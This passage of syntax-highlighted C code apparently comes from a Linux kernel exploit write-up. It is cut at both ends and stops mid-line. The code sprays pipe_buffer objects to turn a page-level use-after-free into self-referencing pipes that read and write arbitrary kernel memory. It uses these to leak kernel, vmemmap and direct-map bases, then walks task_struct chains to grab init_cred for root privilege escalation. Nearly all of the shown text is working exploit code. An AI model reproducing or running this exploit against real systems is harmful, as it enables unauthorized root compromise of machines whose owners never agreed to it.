class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(tmp, <span class="hljs-string">&quot;peiadhao&quot;</span>)&amp;&amp; nr != i)&#123;<br>            orig_pid = i;<br>            victim_pid = nr;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(victim_pid == <span class="hljs-number">-1</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;failed to find the uaf one!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]We found the victim_pid:%d, original_pid:%d\033[0m\n&quot;</span>, victim_pid, orig_pid);<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECOND_PIPE_BUF_SZ 96</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">info_pipe_buffer</span>;</span><br><span class="hljs-type">int</span> victim_second_pid = <span class="hljs-number">-1</span>, orig_second_pid;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">construct_second_uaf</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> second_pipe_sz = <span class="hljs-number">0x1000</span> * (SECOND_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    <span class="hljs-type">size_t</span> pipe_buf[<span class="hljs-number">0x100</span>];<br>    info_log(<span class="hljs-string">&quot;Step III:Constrcut the second page level uaf...&quot;</span>);<br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], buf, SECOND_PIPE_BUF_SZ*<span class="hljs-number">2</span> - <span class="hljs-number">3</span>*<span class="hljs-number">8</span> - <span class="hljs-number">3</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Free the original pipe...&quot;</span>);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Spraying the smaller pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == victim_qidx || i == victim_pid || i == orig_pid)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, second_pipe_sz) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;realloc the pipe_buffer failed!&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">memset</span>(pipe_buf, <span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-keyword">sizeof</span>(pipe_buf));<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], buf, SECOND_PIPE_BUF_SZ - <span class="hljs-number">8</span> - <span class="hljs-number">4</span>);<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], pipe_buf, <span class="hljs-number">0x28</span>);<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x28</span>/<span class="hljs-number">8</span>; i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[--- data dump ---][%d] %lx\n&quot;</span>, i, pipe_buf[i]);<br>    &#125;<br>    <span class="hljs-built_in">memcpy</span>(&amp;info_pipe_buffer, pipe_buf, <span class="hljs-number">0x28</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]info_pipe_buffer-&gt;page    :%p\033[0m\n&quot;</span>, info_pipe_buffer.page);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]info_pipe_buffer-&gt;offset  :%d\033[0m\n&quot;</span>, info_pipe_buffer.offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]info_pipe_buffer-&gt;len     :%d\033[0m\n&quot;</span>, info_pipe_buffer.len);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]info_pipe_buffer-&gt;ops     :%p\033[0m\n&quot;</span>, info_pipe_buffer.ops);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]info_pipe_buffer-&gt;flags   :%d\033[0m\n&quot;</span>, info_pipe_buffer.flags);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]info_pipe_buffer-&gt;private :%ld\033[0m\n&quot;</span>, info_pipe_buffer.private);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">35</span>; i++)&#123;<br>        write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;info_pipe_buffer, <span class="hljs-number">0x28</span>);<br>        write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], buf, SECOND_PIPE_BUF_SZ - <span class="hljs-number">0x28</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++)&#123;<br>        <span class="hljs-type">int</span> nr;<br>        <span class="hljs-type">char</span> tmp[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-keyword">if</span>(i == victim_qidx || i == victim_pid || i == orig_pid)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        <span class="hljs-keyword">if</span>(nr &lt; PIPE_SPRAY_NR &amp;&amp; nr != i)&#123;<br>            orig_second_pid = i;<br>            victim_second_pid = nr;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(victim_second_pid == <span class="hljs-number">-1</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Can not find the second victim pid&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]We found the 2nd victim_pid:%d, 2nd original_pid:%d\033[0m\n&quot;</span>, victim_second_pid, orig_second_pid);<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_pipe_buffer</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> THIRD_PIPE_BUF_SZ 192</span><br><span class="hljs-type">int</span> self_2nd_pid = <span class="hljs-number">-1</span>, self_3rd_pid = <span class="hljs-number">-1</span>, self_4th_pid = <span class="hljs-number">-1</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">build_self_writing_pipe</span><span class="hljs-params">()</span>&#123;<br>    info_log(<span class="hljs-string">&quot;Step IV:Building the self menufication pipe...&quot;</span>);<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> * <span class="hljs-title">tmp_page</span>;</span><br>    <span class="hljs-type">int</span> third_pipe_sz = <span class="hljs-number">0x1000</span>*(THIRD_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    <br>    write(pipe_fd[victim_second_pid][<span class="hljs-number">1</span>], buf, THIRD_PIPE_BUF_SZ - <span class="hljs-number">3</span>*<span class="hljs-number">8</span> - <span class="hljs-number">3</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Free the original second pipe...&quot;</span>);<br>    close(pipe_fd[orig_second_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[orig_second_pid][<span class="hljs-number">1</span>]);<br>    <br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Spraying the smaller pipe_buffer...&quot;</span>);<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == victim_qidx || i == victim_pid || i == orig_pid<br>           || i == victim_second_pid || i == orig_second_pid)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, third_pipe_sz) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Realloc the 192 pipe_buffers failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_pipe_buffer, &amp;info_pipe_buffer, <span class="hljs-number">0x28</span>);<br>    evil_pipe_buffer.offset = THIRD_PIPE_BUF_SZ;<br>    evil_pipe_buffer.len = THIRD_PIPE_BUF_SZ;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Construct the 2nd self read/write pipe...&quot;</span>);<br>    write(pipe_fd[victim_second_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buffer, <span class="hljs-number">0x28</span>);<br>    write(pipe_fd[victim_second_pid][<span class="hljs-number">1</span>], buf, THIRD_PIPE_BUF_SZ - <span class="hljs-number">0x28</span>);<br>    <br>     <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == victim_qidx || i == victim_pid || i == orig_pid<br>           || i == victim_second_pid || i == orig_second_pid)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;tmp_page, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>));<br>        <span class="hljs-keyword">if</span>(tmp_page == evil_pipe_buffer.page)&#123;<br>            self_2nd_pid = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(self_2nd_pid == <span class="hljs-number">-1</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Find the 2nd self pipe failed!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Construct the 3rd self read/write pipe...&quot;</span>);<br>    write(pipe_fd[victim_second_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buffer, <span class="hljs-number">0x28</span>);<br>    write(pipe_fd[victim_second_pid][<span class="hljs-number">1</span>], buf, THIRD_PIPE_BUF_SZ - <span class="hljs-number">0x28</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == victim_qidx <br>           || i == victim_pid || i == orig_pid<br>           || i == victim_second_pid || i == orig_second_pid<br>           || i == self_2nd_pid)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;tmp_page, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>));<br>        <span class="hljs-keyword">if</span>(tmp_page == evil_pipe_buffer.page)&#123;<br>            self_3rd_pid = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(self_3rd_pid == <span class="hljs-number">-1</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Find the 3rd self pipe failed!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Construct the 4th self read/write pipe...&quot;</span>);<br>    write(pipe_fd[victim_second_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buffer, <span class="hljs-number">0x28</span>);<br>    write(pipe_fd[victim_second_pid][<span class="hljs-number">1</span>], buf, THIRD_PIPE_BUF_SZ - <span class="hljs-number">0x28</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == victim_qidx <br>           || i == victim_pid || i == orig_pid<br>           || i == victim_second_pid || i == orig_second_pid<br>           || i == self_2nd_pid<br>           || i == self_3rd_pid)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;tmp_page, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>));<br>        <span class="hljs-keyword">if</span>(tmp_page == evil_pipe_buffer.page)&#123;<br>            self_4th_pid = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(self_4th_pid == <span class="hljs-number">-1</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Find the 4th self pipe failed!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_2nd_pipe</span>;</span>       <span class="hljs-comment">/* pipe_buffer page offset 192 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_3rd_pipe</span>;</span>       <span class="hljs-comment">/* pipe_buffer page offset 192*2 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_4th_pipe</span>;</span>       <span class="hljs-comment">/* pipe_buffer page offset 192*3 */</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">setup_evil_pipe</span><span class="hljs-params">()</span>&#123;<br>     <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]initial the three pipe_buffer...&quot;</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_2nd_pipe, &amp;info_pipe_buffer, <span class="hljs-number">0x28</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_3rd_pipe, &amp;info_pipe_buffer, <span class="hljs-number">0x28</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_4th_pipe, &amp;info_pipe_buffer, <span class="hljs-number">0x28</span>);<br><br>    evil_2nd_pipe.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_pipe.len = <span class="hljs-number">0xff0</span>;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Hijack the pipe_3nd_buf point to the 4th location...&quot;</span>);<br>    evil_3rd_pipe.offset = <span class="hljs-number">3</span>*THIRD_PIPE_BUF_SZ;<br>    evil_3rd_pipe.len = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* make 3rd pipe_buffer point to the 4th_pipe_buffer */</span><br>    write(pipe_fd[self_4th_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_pipe, <span class="hljs-keyword">sizeof</span>(evil_4th_pipe));     <br>    <br>    evil_4th_pipe.offset = THIRD_PIPE_BUF_SZ;<br>    evil_4th_pipe.len = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">char</span> tmp_zero_buf[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-string">&#x27;\x00&#x27;</span>&#125;;<br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page* page_to_read, <span class="hljs-type">void</span>* dst)</span>&#123;<br>    <span class="hljs-comment">/* construct the self_2nd_pipe for reading the page_to_read */</span><br>    evil_2nd_pipe.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_pipe.len = <span class="hljs-number">0xfff</span>;<br>    evil_2nd_pipe.page = page_to_read;<br>    <br>    <span class="hljs-comment">/* let the 4th pipe_buffer point to the 2nd buffer */</span><br>    write(pipe_fd[self_3rd_pid][<span class="hljs-number">1</span>], &amp;evil_4th_pipe, <span class="hljs-keyword">sizeof</span>(evil_3rd_pipe));     <br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read */</span><br>    write(pipe_fd[self_4th_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_pipe, <span class="hljs-keyword">sizeof</span>(evil_4th_pipe));<br>    write(pipe_fd[self_4th_pid][<span class="hljs-number">1</span>], tmp_zero_buf, THIRD_PIPE_BUF_SZ - <span class="hljs-keyword">sizeof</span>(evil_4th_pipe));   <span class="hljs-comment">/* 4th point to the 3rd */</span><br><br>    <span class="hljs-comment">/* recover the initial context */</span><br>    write(pipe_fd[self_4th_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_pipe, <span class="hljs-keyword">sizeof</span>(evil_4th_pipe)); <br><br>    read(pipe_fd[self_2nd_pid][<span class="hljs-number">0</span>], dst, <span class="hljs-number">0xff8</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page* page_to_write, <span class="hljs-type">void</span>* rsc, <span class="hljs-type">size_t</span> len)</span>&#123;<br>    <span class="hljs-comment">/* construct the self_2nd_pipe for writing the page_to_write */</span><br>    evil_2nd_pipe.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_pipe.len = <span class="hljs-number">0</span>;<br>    evil_2nd_pipe.page = page_to_write;<br>    <span class="hljs-comment">/* let the 4th pipe_buffer point tot the 2nd buffer */</span><br>    write(pipe_fd[self_3rd_pid][<span class="hljs-number">1</span>], &amp;evil_4th_pipe, <span class="hljs-keyword">sizeof</span>(evil_4th_pipe));<br>    <br>    <span class="hljs-comment">/* hijack the 2nd pipe for aarbitrary write */</span><br>    write(pipe_fd[self_4th_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_pipe, <span class="hljs-keyword">sizeof</span>(evil_2nd_pipe));<br>    write(pipe_fd[self_4th_pid][<span class="hljs-number">1</span>], tmp_zero_buf, THIRD_PIPE_BUF_SZ - <span class="hljs-keyword">sizeof</span>(evil_2nd_pipe));<br><br>    <span class="hljs-comment">/* recover the initiaal context */</span><br>    write(pipe_fd[self_4th_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_pipe, <span class="hljs-keyword">sizeof</span>(evil_3rd_pipe));<br><br>    write(pipe_fd[self_2nd_pid][<span class="hljs-number">1</span>], rsc, len);<br><br>&#125;<br><br><span class="hljs-type">size_t</span> parent_task, current_task;<br><span class="hljs-type">size_t</span> vmemmap_base, kernel_base, kernel_offset, page_offset_base;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_leaking_by_arbitrary_pipe</span><span class="hljs-params">()</span>&#123;<br>    info_log(<span class="hljs-string">&quot;Step V:Leaking the kernel base addr by arbitrary read...&quot;</span>);<br>    <span class="hljs-type">size_t</span> page_buf[<span class="hljs-number">0x2000</span>];<br>    setup_evil_pipe();<br>    <span class="hljs-type">size_t</span> *comm_addr;<br>    <span class="hljs-type">size_t</span> ptraced;<br>    <span class="hljs-type">int</span> try_hits = <span class="hljs-number">0</span>;<br><br>    vmemmap_base = (<span class="hljs-type">size_t</span>)(info_pipe_buffer.page)&amp;<span class="hljs-number">0xfffffffff0000000</span>;<br>    <span class="hljs-keyword">for</span>(;;)&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Checking for the vmemmap_base&#x27;s reality...&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]possible vmemmap_base:%p\033[0m\n&quot;</span>, (<span class="hljs-type">void</span>*)vmemmap_base);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * We need to know physmap + 0x9d000 fun ptr</span><br><span class="hljs-comment">         * so we should check vmemmap_base + (0x9d000/0x1000)*0x40</span><br><span class="hljs-comment">         * */</span><br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*)(vmemmap_base + <span class="hljs-number">157</span>*<span class="hljs-number">0x40</span>), page_buf);<br>        <span class="hljs-keyword">if</span>(page_buf[<span class="hljs-number">0</span>] == <span class="hljs-number">0x2400000000</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;reading failed!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(page_buf[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">0xffffffff81000000</span> &amp;&amp; (page_buf[<span class="hljs-number">0</span>]&amp;<span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x030</span>)&#123;<br>            kernel_base = page_buf[<span class="hljs-number">0</span>] - <span class="hljs-number">0x30</span>;<br>            kernel_offset = kernel_base -  <span class="hljs-number">0xffffffff81000000</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]kernel_base    :%p\033[0m\n&quot;</span>, (<span class="hljs-type">void</span>*)kernel_base);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]kernel_offset  :%p\033[0m\n&quot;</span>, (<span class="hljs-type">void</span>*)kernel_offset);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        try_hits++;<br>        <span class="hljs-keyword">if</span>(try_hits == <span class="hljs-number">5</span>)&#123;<br>            vmemmap_base -= <span class="hljs-number">0x10000000</span>;<br>            try_hits = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]vmemmap_base   :%p\033[0m\n&quot;</span>, (<span class="hljs-type">void</span>*)vmemmap_base);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Leak the page_offset_base...&quot;</span>);<br><br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; <span class="hljs-number">1</span> ;i++)&#123;<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*)(vmemmap_base + (i<span class="hljs-number">-1</span>)*<span class="hljs-number">0x40</span>), page_buf);<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*)(vmemmap_base + i*<span class="hljs-number">0x40</span>), &amp;((<span class="hljs-type">char</span>*)page_buf)[<span class="hljs-number">0x1000</span>]);<br>        <span class="hljs-comment">/* find the struct task_struct.comm */</span><br>        comm_addr = (<span class="hljs-type">size_t</span>*)memmem(page_buf, <span class="hljs-number">0x1ff0</span>,<span class="hljs-string">&quot;PEIWITHHAO&quot;</span>, <span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">if</span>(comm_addr == <span class="hljs-literal">NULL</span>)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>((((<span class="hljs-type">size_t</span>)comm_addr - (<span class="hljs-type">size_t</span>)page_buf)&amp;<span class="hljs-number">0xfff</span>) &lt; <span class="hljs-number">500</span>)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-comment">//printf(&quot;[*]comm_addr[-2]:%lx\n&quot;, comm_addr[-2]);</span><br>        <span class="hljs-comment">//printf(&quot;[*]comm_aadr[-3]:%lx\n&quot;, comm_addr[-3]);   </span><br>        <span class="hljs-comment">//printf(&quot;[*]comm_aadr[-52]:%lx\n&quot;, comm_addr[-3]);</span><br>        <span class="hljs-comment">//printf(&quot;[*]comm_aadr[-53]:%lx\n&quot;, comm_addr[-3]);    </span><br>        <span class="hljs-keyword">if</span>(comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>       <span class="hljs-comment">/* task.cred        */</span><br>           &amp;comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>      <span class="hljs-comment">/* task.real_cred   */</span> <br>           &amp;comm_addr[<span class="hljs-number">-52</span>] &gt; <span class="hljs-number">0xffff888000000000</span>     <span class="hljs-comment">/* task.parent      */</span><br>           &amp;comm_addr[<span class="hljs-number">-53</span>] &gt; <span class="hljs-number">0xffff888000000000</span>)&#123;   <span class="hljs-comment">/* task.real_parent */</span><br>            parent_task = comm_addr[<span class="hljs-number">-53</span>];<br>            ptraced = comm_addr[<span class="hljs-number">-46</span>];               <span class="hljs-comment">/* task.ptraced     */</span><br>            current_task = (comm_addr[<span class="hljs-number">-46</span>] - <span class="hljs-number">2280</span>);        <span class="hljs-comment">/* current_task */</span><br>            page_offset_base = (<span class="hljs-type">size_t</span>)current_task - i*<span class="hljs-number">0x1000</span>;<br>            page_offset_base &amp;= <span class="hljs-number">0xfffffffff0000000</span>;<br>            PRINT_ADDR(<span class="hljs-string">&quot;current_task&quot;</span>, current_task);<br>            PRINT_ADDR(<span class="hljs-string">&quot;parent_task&quot;</span>, parent_task);<br>            PRINT_ADDR(<span class="hljs-string">&quot;page_offset_base&quot;</span>, page_offset_base);<br><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">direct_mapping_addr2page</span><span class="hljs-params">(<span class="hljs-type">size_t</span> addr)</span>&#123;<br>    <span class="hljs-type">size_t</span> page_nr = ((addr&amp;(~<span class="hljs-number">0xfff</span>)) - page_offset_base)/<span class="hljs-number">0x1000</span>;<br>    <span class="hljs-keyword">return</span> (vmemmap_base + page_nr*<span class="hljs-number">0x40</span>);<br>&#125;<br><br><br><span class="hljs-type">size_t</span> page_buf[<span class="hljs-number">0x8000</span>];<br><span class="hljs-type">size_t</span> init_task, init_cred, init_nsproxy;<br><span class="hljs-type">void</span> <span class="hljs-title function_">priviledge_escalation</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">size_t</span> *task_buf;<br>    <span class="hljs-type">size_t</span> parent_page;<br>    info_log(<span class="hljs-string">&quot;Step VI:Hijack the current_task to get the root...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(;;)&#123;<br>        parent_page = direct_mapping_addr2page(parent_task);<br>        task_buf = (<span class="hljs-type">size_t</span>*)((<span class="hljs-type">size_t</span>)page_buf + (parent_task &amp; <span class="hljs-number">0xfff</span>));<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*)parent_page, page_buf);<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*)(parent_page + <span class="hljs-number">0x40</span>), &amp;page_buf[<span class="hljs-number">0x1000</span>/<span class="hljs-number">8</span>]);<br>        <br>        <span class="hljs-comment">/* task_struct.real_parent offset is 2224 */</span><br>        <span class="hljs-keyword">if</span>(parent_task == task_buf[<span class="hljs-number">2224</span>/<span class="hljs-number">8</span>])&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        parent_task = task_buf[<span class="hljs-number">2224</span>/<span class="hljs-number">8</span>];<br>    &#125;<br>    init_task = parent_task;<br>    <span class="hljs-comment">/* task_struct.cred offset is 2632 */</span><br>    init_cred = task_buf[<span class="hljs-number">2632</span>/<span class="hljs-number">8</span>];<br>    init_nsproxy = task_buf[<span class="hljs-number">341</span>];<br>    PRINT_ADDR(<span class="hljs-string">&quot;[*]init_task&quot;</span>, (<span class="hljs-type">size_t</span>)init_task);<br>    PRINT_ADDR(<span class="hljs-string">&quot;[*]init_cred&quot;</span>, (<span class="hljs-type">size_t</span>)init_cred);<br>    PRINT_ADDR(<span class="hljs-string">&quot;[*]init_nsproxy&quot;</span>, (<span class="hljs-type">size_t</span>)init_nsproxy);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Escalating root priviledge now!&quot;</span>);<br>    <span class="hljs-type">size_t</span> current_page;<br>    current_page = direct_mapping_addr2page(current_task);<br>    <br>    <span class="hljs-built_in">memset</span>(page_buf, <span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-keyword">sizeof</span>(page_buf));<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*)current_page, page_buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*)(current_page + <span class="hljs-number">0x40</span>), &amp;page_buf[<span class="hljs-number">0x1000</span>/<span class="hljs-number">8</span>]);<br>    <br>    task_buf = (<span class="hljs-type">size_t</span>*)((<span class="hljs-type">size_t</span>)page_buf + (current_task &amp; <span 